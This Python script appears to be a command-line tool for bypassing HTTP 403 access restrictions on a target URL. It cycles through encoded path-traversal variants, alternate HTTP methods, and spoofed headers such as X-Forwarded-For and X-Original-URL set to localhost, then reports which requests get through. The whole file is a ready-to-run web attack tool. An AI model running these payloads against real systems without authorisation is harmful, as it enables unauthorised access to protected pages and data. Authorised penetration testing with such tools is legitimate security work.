import requests
import re
import argparse

first = ["%2e/", "%252e/", "%2e%2f", "%2e%c0%af", "%252e%c0%af"]
pre_path = ["%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
past_path = ["pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa%c1%9clupa%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c", "/"]
replace_slash = ["?", "??", "\\", "/\".hithere", "..;/"]
response_codes = {}

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="target", help="Target url")
    arguments = parser.parse_args()

    if not arguments.target:
        parser.error("[-] error: null target")
    
    return arguments


def print_status_codes():
    print("Done\nStatus codes:")
    for code in response_codes:
        print("[{}] - {} times".format(code, response_codes[code]))

def get_last(url):
    parts = re.search('(.+)(\/.+)$', url)
    return parts.group(1), parts.group(2)

def get_main(url):
    slash = re.search('(.+\..+?\/)(.*)', url)
    return slash.group(1), slash.group(2)

def basic_tests(url, main, rest):
    access_test(url, "post")
    access_test(url, "head")
    access_test(url, "options")
    access_test(url, "put")
    access_test(url, "patch")
    access_test(url, "get", { 'Referer': url })
    access_test(url, "get", { 'X-Custom-IP-Authorization': "127.0.0.1" })
    access_test(url, "get", { 'X-Originationg-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Forwarded-For': "127.0.0.1" })
    access_test(url, "get", { 'X-Remote-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Client-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Host': "127.0.0.1" })
    access_test(url, "get", { 'X-Forwarded-Host': "127.0.0.1" })
    access_test(main, "get", { 'X-Rewrite-URL': '/' + rest })    
    access_test(main, "get", { 'X-Original-URL': '/' + rest })

def directory_test(url):
    directory = True if url[-1] is '/' else False
    response_codes = {}
    path, last = get_last(url)
    main, rest = get_main(url)

    basic_tests(url, main, rest)

    for f in first:
        access_test(url.replace(main, main + f))

    for p in past_path:
        if directory:                
            access_test(url + p)
        else:
            access_test(url + "/" + p)

    for r in replace_slash:
        if directory:
            access_test(url[:-1] + r)
        else:
            access_test(url + r)

    for pre in pre_path:
        if directory:
            npath = path + "/" + last[:-1].replace('/', pre) + "/"
        else:
            npath = path + "/" + last.replace('/', pre)
        access_test(npath)
    print_status_codes()

def request(path, rtype = "get", h = ""):
    if rtype is "get":
        if h == "":
            response = requests.get(path, timeout=2.5)
        else:
            response = requests.get(path, headers=h, timeout=2.5)            
    elif rtype is "post":
        response = requests.post(path, headers={ 'Content-Length': '0' }, timeout=2.5)
    elif rtype is "head":
        response = requests.head(path, timeout=2.5)
    elif rtype is "options":
        response = requests.options(path, timeout=2.5)
    elif rtype is "put":
        response = requests.put(path, timeout=2.5)
    elif rtype is "patch":
        response = requests.patch(path, timeout=2.5)
    else:
        return "error"
    return response

def access_test(path, rtype = "get", h = ""):
    try:
        response = request(path, rtype, h)        
        sc = response.status_code
        if sc != 403 and sc != 404 and sc != 400 and sc != 500:
            print("\n{} - [{}] with {} and header {}".format(path, response.status_code, rtype, h))
        if response.status_code not in response_codes:
            response_codes[response.status_code] = 1
        else:
            response_codes[response.status_code] += 1
    except Exception as e:
        print(e)

def main():
    args = get_args()
    try:
        directory_test(args.target)
    except KeyboardInterrupt:
        print("\nAborted\n")

if __name__ == "__main__":
    main()
